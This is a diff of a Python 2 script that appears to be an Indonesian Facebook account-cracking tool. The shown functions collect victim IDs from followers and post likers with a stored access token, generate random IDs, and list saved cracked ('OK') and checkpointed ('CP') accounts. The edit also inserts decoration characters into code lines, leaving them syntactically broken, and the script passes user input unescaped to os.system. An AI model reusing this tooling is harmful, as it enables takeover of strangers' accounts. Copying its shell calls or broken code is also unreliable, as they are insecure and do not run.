@@ -263,17 +263,17 @@ def followers():
 	try:
 		token = open("token.txt", "r").read()
 	except IOError:
-		exit(" [!] token kadaluwarsa")
-	print(" [*] isi 'me' jika ingin crack dari pengikut sendiri")
-	idt = raw_input(" [*] masukan id atau username : ")
+		exit(" ╠══[!] token kadaluwarsa")
+	print(" ╠══[*] isi 'me' jika ingin crack dari pengikut sendiri")
+	idt = raw_input(" ╠══[*] masukan id atau username : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" [!] akun tidak tersedia atau list teman private")
-	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
+		exit(" ╠══[!] akun tidak tersedia atau list teman private")
+	print("\n ╠══[+] total id  : %s%s%s"%(M,len(id),N))
 	
 ### DUMP POSTINGAN ###
 def postingan():
@@ -281,55 +281,55 @@ def postingan():
 	try:
 		token = open("token.txt", "r").read()
 	except IOError:
-		exit(" [!] token kadaluwarsa")
-	idt = raw_input(" [?] masukan url atau id postingan : ")
+		exit(" ╠══[!] token kadaluwarsa")
+	idt = raw_input(" ╠══[?] masukan url atau id postingan : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit(" [!] postingan tidak tersedia atau post private")
-	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
+		exit(" ╠══[!] postingan tidak tersedia atau post private")
+	print("\n ╠══[+] total id  : %s%s%s"%(M,len(id),N))
 	
 ### DUMP NEW FB ###
 def fbbaru():
 	x = 11111111111
 	xx = 77777777777
 	idx = "1000" 
-	limit = int(input(" [+] masukan jumlah id Maksimal 5000 id: "))
+	limit = int(input(" ╠══[+] masukan jumlah id Maksimal 5000 id: "))
 	try:
 		for n in range(limit):
 			_ = random.randint(x,xx)
 			__ = idx
 			id.append(__+"<=>"+str(_))
 	except KeyError:
-		exit(" [!] akun tidak tersedia atau error")
-	print("\n [+] total id  : %s%s%s"%(M,len(id),N))
+		exit(" ╠══[!] akun tidak tersedia atau error")
+	print("\n ╠══[+] total id  : %s%s%s"%(M,len(id),N))
 ### CEK DATA² TARGET ###
 def igg():
-    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
-    raw_input('\n [*] kembali ')
+    jalan(' ╠══[*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
+    raw_input('\n ╠══[*] kembali ')
     menu()
 ####INFO TOOLS####
 def info_tools():
     os.system('clear')
-    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Bintang XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Author   \x1b[1;93m: BINTANG-XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/bot-85'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Team     \x1b[1;93m: XNX-CODE TEAM 2021'%(N,H,N);time.sleep(0.07)
-    print '\n %s\x1b[1;92m[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
-    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));menu()
+    print ' %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: Bintang XD.'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Author   \x1b[1;93m: BINTANG-XD.'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/bot-85'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Team     \x1b[1;93m: XNX-CODE TEAM 2021'%(N,H,N);time.sleep(0.07)
+    print '\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N);time.sleep(0.07)
+    print '\n %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
+    raw_input('\n  ╠══[ %sKEMBALI%s ] '%(O,N));menu()
 
 ### CEK HASIL CRACK ###
 def cekhasil():
-	print('\n [1]. l\x1b[1;92mihat hasil crack OK ')
-	print(' [2]. \x1b[1;93mlihat hasil crack CP ')
-	anjg = raw_input('\n [?] pilih : \x1b[1;93m')
+	print('\n ╠══[1]. l\x1b[1;92mihat hasil crack OK ')
+	print(' ╠══[2]. \x1b[1;93mlihat hasil crack CP ')
+	anjg = raw_input('\n ╠══[?] pilih : \x1b[1;93m')
 	if anjg == '':
 		menu()
 	elif anjg == "1":
@@ -343,13 +343,13 @@ def cekhasil():
 				menu()
 			totalok = open("OK/%s"%(file)).read().splitlines()
 		except IOError:
-			exit(" [!] file %s tidak tersedia"%(file))
-		nm_file = ("%s"%(file)).replace("-", " ")
+			exit(" ╠══[!] file %s tidak tersedia"%(file))
+		nm_file = ("%s"%╠══(file)).replace("-", " ")
 		del_txt = nm_file.replace(".txt", "")
 		print("\n *-------------------------------------------------*")
-		print(" \x1b[1;92m[+] tanggal : \x1b[1;93m%s -total : \x1b[1;93m%s"%(del_txt, len(totalok)))
+		print(" \x1b[1;92m╠══[+] tanggal : \x1b[1;93m%s -total : \x1b[1;93m%s"%(del_txt, len(totalok)))
 		os.system("cat OK/%s"%(file))
-		raw_input("\n [*]\x1b[1;93m tekan enter untuk kembali ke menu")
+		raw_input("\n ╠══[*]\x1b[1;93m tekan enter untuk kembali ke menu")
 		menu()
 	elif anjg == "2":
 		dirs = os.listdir("CP")
@@ -357,18 +357,18 @@ def cekhasil():
 		for file in dirs:
 			print(" [*] "+file)
 		try:
-			file = raw_input("\n [?] \x1b[1;93mmau Cek yang mana ? : \x1b[1;92m" )
+			file = raw_input("\n ╠══[?] \x1b[1;93mmau Cek yang mana ? : \x1b[1;92m" )
 			if file == "":
 				menu()
-			totalcp = open("CP/%s"%(file)).read().splitlines()
+			totalcp = open("CP/%s"%╠══(file)).read().splitlines()
 		except IOError:
-			exit(" [!] file %s tidak tersedia"%(file))
+			exit(" ╠══[!] file %s tidak tersedia"%(file))
 		nm_file = ("%s"%(file)).replace("-", " ")
 		del_txt = nm_file.replace(".txt", "")
 		print("\n *-------------------------------------------------*")
-		print(" \x1b[1;93m[+] tanggal : \x1b[1;92m%s -total : \x1b[1;93m%s"%(del_txt, len(totalcp)))
+		print(" \x1b[1;93m╠══[+] tanggal : \x1b[1;92m%s -total : \x1b[1;93m%s"%(del_txt, len(totalcp)))
 		os.system("cat CP/%s"%(file))
-		raw_input("\n [*] \x1b[1;93mtekan enter untuk kembali ke menu ")
+		raw_input("\n ╠══[*] \x1b[1;93mtekan enter untuk kembali ke menu ")
 		menu()
 	else:
 		menu()
